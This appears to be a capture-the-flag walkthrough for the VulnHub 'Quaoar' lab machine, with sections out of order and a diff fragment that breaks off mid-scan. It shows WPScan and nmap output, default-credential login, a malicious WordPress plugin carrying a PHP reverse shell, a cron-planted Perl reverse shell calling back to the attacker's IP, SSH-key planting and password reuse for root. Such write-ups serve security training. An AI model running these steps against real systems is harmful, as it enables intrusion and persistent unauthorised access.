https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |</div><div> | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins</div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9173</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460</div><div> |</div><div> | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing</div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9174</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |</div><div> | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers</div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9175</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution</font></div><div> |     Fixed in: 5.0.1</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9222</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</div><div> |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</div><div> |</div><div> | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)</div><div> |     Fixed in: 3.9.27</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9230</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787</div><div> |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b</div><div> |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/</div><div> |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/</div><div><div><br/></div><div><br/></div></div><div>[+] WordPress theme in use: twentyfourteen</div><div> | Location: http://10.183.0.219/wordpress/wp-content/themes/twentyfourteen/</div><div> | Last Updated: 2019-02-21T00:00:00.000Z</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] The version is out of date, the latest version is 2.6</font></div><div> | Style URL: http://10.183.0.219/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14</div><div> | Style Name: Twenty Fourteen</div><div> | Style URI: http://wordpress.org/themes/twentyfourteen</div><div> | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...</div><div> | Author: the WordPress team</div><div> | Author URI: http://wordpress.org/</div><div> |</div><div> | Detected By: Css Style (Passive Detection)</div><div> |</div><div> | Version: 1.1 (80% confidence)</div><div> | Detected By: Style (Passive Detection)</div><div> |  - http://10.183.0.219/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14, Match: 'Version: 1.1'</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating Vulnerable Plugins (via Passive Methods)</div><div>[+] Checking Plugin Versions (via Passive and Aggressive Methods)</div><div><div><br/></div><div><br/></div></div><div>[i] Plugin(s) Identified:</div><div><div><br/></div><div><br/></div></div><div>[+] mail-masta</div><div> | Location: http://10.183.0.219/wordpress/wp-content/plugins/mail-masta/</div><div> | Latest Version: 1.0 (up to date)</div><div> | Last Updated: 2014-09-19T07:52:00.000Z</div><div> |</div><div> | Detected By: Urls In Homepage (Passive Detection)</div><div> |</div><div> | [!] 2 vulnerabilities identified:</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)</font></div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8609</div><div> |      - https://www.exploit-db.com/exploits/40290/</div><div> |      - https://cxsecurity.com/issue/WLB-2016080220</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: Mail Masta 1.0 - Multiple SQL Injection</font></div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8740</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098</div><div> |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin</div><div> |</div><div> | Version: 1.0 (100% confidence)</div><div> | Detected By: Readme - Stable Tag (Aggressive Detection)</div><div> |  - http://10.183.0.219/wordpress/wp-content/plugins/mail-masta/readme.txt</div><div> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</div><div> |  - http://10.183.0.219/wordpress/wp-content/plugins/mail-masta/readme.txt</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</div><div> Checking Known Locations - Time: 00:00:00 &lt;======================================================================&gt; (289 / 289) 100.00% Time: 00:00:00</div><div>[+] Checking Theme Versions (via Passive and Aggressive Methods)</div><div><div><br/></div><div><br/></div></div><div>[i] No themes Found.</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</div><div> Checking Known Locations - Time: 00:00:04 &lt;====================================================================&gt; (2573 / 2573) 100.00% Time: 00:00:04</div><div><div><br/></div><div><br/></div></div><div>[i] No Timthumbs Found.</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating Config Backups (via Passive and Aggressive Methods)</div><div> Checking Config Backups - Time: 00:00:00 &lt;=========================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</div><div><div><br/></div><div><br/></div></div><div>[i] No Config Backups Found.</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating DB Exports (via Passive and Aggressive Methods)</div><div> Checking DB Exports - Time: 00:00:00 &lt;=============================================================================&gt; (36 / 36) 100.00% Time: 00:00:00</div><div><div><br/></div><div><br/></div></div><div>[i] No DB Exports Found.</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)</div><div> Brute Forcing Attachment IDs - Time: 00:00:11 &lt;==================================================================&gt; (100 / 100) 100.00% Time: 00:00:11</div><div><div><br/></div><div><br/></div></div><div>[i] No Medias Found.</div><div><div><br/></div><div><br/></div></div><div>[+] Enumerating Users (via Passive and Aggressive Methods)</div><div> Brute Forcing Author IDs - Time: 00:00:01 &lt;========================================================================&gt; (10 / 10) 100.00% Time: 00:00:01</div><div><div><br/></div><div><br/></div></div><div>[i] User(s) Identified:</div><div><div><br/></div><div><br/></div></div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">[+] admin</font></div><div> | Detected By: Author Posts - Display Name (Passive Detection)</div><div> | Confirmed By:</div><div> |  Rss Generator (Passive Detection)</div><div> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> |  Login Error Messages (Aggressive Detection)</div><div><div><br/></div><div><br/></div></div><div>[+] wpuser</div><div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div><div> | Confirmed By: Login Error Messages (Aggressive Detection)</div><div><div><br/></div><div><br/></div></div><div><div><br/></div><div><br/></div></div><div>[+] Finished: Sun Apr 14 21:38:25 2019</div><div>[+] Requests Done: 3095</div><div>[+] Cached Requests: 8</div><div>[+] Data Sent: 704.021 KB</div><div>[+] Data Received: 23.946 MB</div><div>[+] Memory used: 202.574 MB</div><div>[+] Elapsed time: 00:00:23</div></div><div><br/></div><div>Several vulnerabilities were detected. The default 'admin' account is also available. Did some basic login tests with the username 'admin' and found that the password is also 'admin'.</div><div><br/></div><div>*** ADD HYDRA INFO HERE ***</div><div><br/></div><div>Logged in to the WordPress site with the credentials 'admin:admin'. Now that we have admin access, I used the malicious-wordpress-plugin generator (downloaded from <a href="https://github.com/wetw0rk/malicious-wordpress-plugin" target="_blank">https://github.com/wetw0rk/malicious-wordpress-plugin</a>) to create a PHP reverse shell. I had to modify the default payload to use a basic shell (since meterpreter shells are restricted during the OSCP exam).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/quaoar/malicious-wordpress-plugin# python wordpwn.py 10.183.0.222 5432 N</div><div>[*] Checking if msfvenom installed</div><div>[+] msfvenom installed</div><div>[+] Generating plugin script</div><div>[+] Writing plugin script to file</div><div>[+] Generating payload To file</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>Found 1 compatible encoders</div><div>Attempting to encode payload with 1 iterations of php/base64</div><div>php/base64 succeeded with size 4041 (iteration=0)</div><div>php/base64 chosen with final size 4041</div><div>Payload size: 4041 bytes</div><div><div><br/></div><div><br/></div></div><div>[+] Writing files to zip</div><div>[+] Cleaning up files</div><div>[+] General Execution Location: http://(target)/wp-content/plugins/malicous/</div><div>[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload</div></div><div><br/></div><div><img height="198" src="/assets/images/2019-04-15-hackfest2016-quaoar/E0ADE58E-2C09-43BF-B1BC-5F0440B95496.png" width="449"/><br/></div><div><br/></div><div>Once the malicious plugin was uploaded, I started a listener in Metasploit.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler </div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 0.</div><div>[*] Exploit completed, but no session was created.</div><div>msf5 exploit(multi/handler) &gt; </div><div>[*] Started reverse TCP handler on 10.183.0.222:5432</div></div><div><br/></div><div>I then browsed to the plugin files and clicked the wetw0rk_maybe.php file (containing the reverse PHP shell).</div><div><br/></div><div><a href="http://10.183.0.219/wordpress/wp-content/plugins/malicous/">http://10.183.0.219/wordpress/wp-content/plugins/malicous/</a></div><div><br/></div><div><img height="240" src="/assets/images/2019-04-15-hackfest2016-quaoar/8E2CF543-A76F-4B4F-A41B-FD1EF74EF6E1.png" width="690"/><br/></div><div><br/></div><div>This resulted in a new session in Metasploit.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.219:58920) at 2019-04-15 00:38:15 -0400</div></div><div><br/></div><div>The PHP reverse shell has a limited active period, so I worked quickly to check to see if the www-data user had a home directory and default shell defined in /etc/passwd.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>grep `whoami` /etc/passwd</div><div>www-data:x:33:33:www-data:/var/www:/bin/sh</div></div><div><br/></div><div>Since SSH is enabled on the host, and the user has a home directory and default shell, I moved to the /var/www directory and created a .ssh directory. I created an authorized_keys file and copied my SSH public key to the file. With this, I was able to SSH to the server.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/quaoar/malicious-wordpress-plugin# ssh -i test www-data@10.183.0.219</div><div>Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)</div><div><div><br/></div><div><br/></div></div><div> * Documentation:  https://help.ubuntu.com/</div><div><div><br/></div><div><br/></div></div><div>  System information as of Mon Apr 15 01:05:30 EDT 2019</div><div><div><br/></div><div><br/></div></div><div>  System load:  0.01              Processes:             99</div><div>  Usage of /:   29.9% of 7.21GB   Users logged in:       0</div><div>  Memory usage: 66%               IP address for eth0:   10.183.0.219</div><div>  Swap usage:   0%                IP address for virbr0: 192.168.122.1</div><div><div><br/></div><div><br/></div></div><div>  Graph this data and manage this system at https://landscape.canonical.com/</div><div><div><br/></div><div><br/></div></div><div>New release '14.04.5 LTS' available.</div><div>Run 'do-release-upgrade' to upgrade to it.</div><div><div><br/></div><div><br/></div></div><div>Last login: Mon Apr 15 00:52:53 2019 from kali.homenet.dom</div><div>$</div></div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>After using SSH to connect to the host, I installed a crontab for the www-data user to continually try to connect back to my attacking machine on port 5433 (using a Perl reverse shell). Now, if I get discovered and shut out of SSH and can get back in with the reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>SHELL=/bin/bash</div><div>PATH=/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</div><div>MAILTO=root</div><div><div><br/></div></div><div># For details see man 4 crontabs</div><div><div><br/></div></div><div># Example of job definition:</div><div># .---------------- minute (0 - 59)</div><div># |  .------------- hour (0 - 23)</div><div># |  |  .---------- day of month (1 - 31)</div><div># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</div><div># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</div><div># |  |  |  |  |</div><div># *  *  *  *  * command to be executed</div><div><div><br/></div></div><div>#min hour day mon dow command</div><div>*/5    *    *   *   *   perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>Searching through /etc and /boot I was able to determine the system is running Ubuntu 12.04 with kernel 3.2.0-23. Searching the exploit database, there seems to be a local privilege escalation vulnerability with this version.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Esca | exploits/linux_x86-64/local/33589.c</div></div><div><br/></div><div>I attempted to transfer the .c file to the victim, but it doesn't have gcc. Instead, I had to cross-compile the exploit on my attacking machine after installing some libraries.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>sudo apt-get install gcc-multilib g++-multilib</div><div>gcc -m32 -o 33589 33589.c</div></div><div><br/></div><div>Unfortunately, the exploit failed to run properly on the victim.</div><div><br/></div><div>Decided to track back to where I dropped in to the box and look for credentials in the /var/www directory. I checked the wp-config.php file for the WordPress site and found the database credentials.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>cat wp-config.php</div><div>&lt;?php</div><div>/**</div><div> * The base configurations of the WordPress.</div><div> *</div><div> * This file has the following configurations: MySQL settings, Table Prefix,</div><div> * Secret Keys, WordPress Language, and ABSPATH. You can find more information</div><div> * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing</div><div> * wp-config.php} Codex page. You can get the MySQL settings from your web host.</div><div> *</div><div> * This file is used by the wp-config.php creation script during the</div><div> * installation. You don't have to use the web site, you can just copy this file</div><div> * to "wp-config.php" and fill in the values.</div><div> *</div><div> * @package WordPress</div><div> */</div><div>  </div><div>// ** MySQL settings - You can get this info from your web host ** //</div><div>/** The name of the database for WordPress */</div><div>define('DB_NAME', 'wordpress');</div><div>  </div><div>/** MySQL database username */</div><div>define('DB_USER', 'root');</div><div>  </div><div>/** MySQL database password */</div><div>define('DB_PASSWORD', 'rootpassword!');</div><div>  </div><div>/** MySQL hostname */</div><div>define('DB_HOST', 'localhost');</div><div><br/></div><div>[...]</div></div><div><br/></div><div>I tried to SSH to the box using the same root password defined in the config file and it worked! Got the flag in /root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/quaoar# ssh root@10.183.0.219</div><div>root@10.183.0.219's password: </div><div><div><br/></div><div><br/></div></div><div>Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)</div><div><div><br/></div><div><br/></div></div><div> * Documentation:  https://help.ubuntu.com/</div><div><div><br/></div><div><br/></div></div><div>  System information as of Mon Apr 15 10:45:37 EDT 2019</div><div><div><br/></div><div><br/></div></div><div>  System load:  0.12              Processes:             104</div><div>  Usage of /:   30.4% of 7.21GB   Users logged in:       1</div><div>  Memory usage: 13%               IP address for eth0:   10.183.0.219</div><div>  Swap usage:   3%                IP address for virbr0: 192.168.122.1</div><div><div><br/></div><div><br/></div></div><div>  Graph this data and manage this system at https://landscape.canonical.com/</div><div><div><br/></div><div><br/></div></div><div>New release '14.04.5 LTS' available.</div><div>Run 'do-release-upgrade' to upgrade to it.</div><div><div><br/></div><div><br/></div></div><div>Last login: Sun Jan 15 11:23:45 2017 from desktop-g0lhb7o.snolet.com</div><div>root@Quaoar:~#</div><div>root@Quaoar:~# cat flag.txt </div><div>8e3f9ec016e3598c5eec11fd3d73f6fb</div></div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div>*** REMOVE CRON JOB ***</div><div>*** REMOVE /var/www/.ssh ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">Flags</span></div><div><br/></div><div>I found a "flag" in the /home/wpadmin directory.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Quaoar:/home/wpadmin$ cat flag.txt </div><div>2bafe61f03117ac66a73c3c514de796e</div></div><div><br/></div><div>I found a "flag" in the php5 cron job.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Quaoar:/etc/cron.d$ cat php5 </div><div># /etc/cron.d/php5: crontab fragment for php5</div><div>#  This purges session files older than X, where X is defined in seconds</div><div>#  as the largest value of session.gc_maxlifetime from all your php.ini</div><div>#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime</div><div># Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de</div><div># Look for and purge old sessions every 30 minutes</div><div>09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] &amp;&amp; [ -d /var/lib/php5 ] &amp;&amp; find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2&gt;/dev/null \; -delete</div></div><div><br/></div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/hackfest2016-quaoar,180/" target="_blank">https://www.vulnhub.com/entry/hackfest2016-quaoar,180/</a></div>
+<div>Hostname: quaoar</div>
+<div>IP Address: 10.183.0.219</div>
+<div><br /></div>
+<div>Date started: April 14, 2019 7:36 PM</div>
+<div>Date completed: April 15, 2019 9:59 AM</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.219.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/quaoar# nmap -Pn -sT -A -p 1-65535 -oA quaoar 10.183.0.219</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-14 20:44 EDT</div>
+    <div>Nmap scan report for Quaoar.homenet.dom (10.183.0.219)</div>
+    <div>Host is up (0.0025s latency).</div>
+    <div>Not shown: 65526 closed ports</div>
+    <div>PORT    STATE SERVICE     VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>| ssh-hostkey: </div>
+    <div>|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)</div>
+    <div>|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)</div>
+    <div>|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp  open  domain      ISC BIND 9.8.1-P1</font>
+    </div>
+    <div>| dns-nsid: </div>
+    <div>|_  bind.version: 9.8.1-P1</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))</font>
+    </div>
+    <div>| http-robots.txt: 1 disallowed entry </div>
+    <div>|_Hackers</div>
+    <div>|_http-server-header: Apache/2.2.22 (Ubuntu)</div>
+    <div>|_http-title: Site doesn't have a title (text/html).</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">110/tcp open  pop3        Dovecot pop3d</font>
+    </div>
+    <div>|_pop3-capabilities: PIPELINING TOP SASL CAPA STLS UIDL RESP-CODES</div>
+    <div>|_ssl-date: 2019-04-15T00:44:46+00:00; 0s from scanner time.</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">143/tcp open  imap        Dovecot imapd</font>
+    </div>
+    <div>|_imap-capabilities: more ENABLE IDLE SASL-IR ID LITERAL+ LOGIN-REFERRALS post-login have LOGINDISABLEDA0001 Pre-login OK capabilities IMAP4rev1 STARTTLS listed</div>
+    <div>|_ssl-date: 2019-04-15T00:44:45+00:00; 0s from scanner time.</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">993/tcp open  ssl/imaps?</font>
+    </div>
+    <div>|_ssl-date: 2019-04-15T00:44:45+00:00; 0s from scanner time.</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">995/tcp open  ssl/pop3s?</font>
+    </div>
+    <div>|_ssl-date: 2019-04-15T00:44:45+00:00; 0s from scanner time.</div>
+    <div>MAC Address: 08:00:27:5A:46:1B (Oracle VirtualBox virtual NIC)</div>
+    <div>Device type: general purpose</div>
+    <div>Running: Linux 2.6.X|3.X</div>
+    <div>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div>
+    <div>OS details: Linux 2.6.32 - 3.10</div>
+    <div>Network Distance: 1 hop</div>
+    <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Host script results:</div>
+    <div>|_clock-skew: mean: 40m00s, deviation: 1h37m59s, median: 0s</div>
+    <div>|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div>
+    <div>| smb-os-discovery: </div>
+    <div>|   OS: Unix (Samba 3.6.3)</div>
+    <div>|   Computer name: Quaoar</div>
+    <div>|   NetBIOS computer name: </div>
+    <div>|   Domain name: homenet.dom</div>
+    <div>|   FQDN: Quaoar.homenet.dom</div>
+    <div>|_  System time: 2019-04-14T20:44:46-04:00</div>
+    <div>| smb-security-mode: </div>
+    <div>|   account_used: guest</div>
+    <div>|   authentication_level: user</div>
+    <div>|   challenge_response: supported</div>
+    <div>|_  message_signing: disabled (dangerous, but default)</div>
+    <div>|_smb2-time: Protocol negotiation failed (SMB2)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   2.50 ms Quaoar.homenet.dom (10.183.0.219)</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 155.90 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Started by looking at the HTTP service on TCP port 80. The default site just returns some images.</div>
+<div><br /></div>
+<div>Scanned the service with nikto.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/quaoar# nikto -h http://10.183.0.219</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
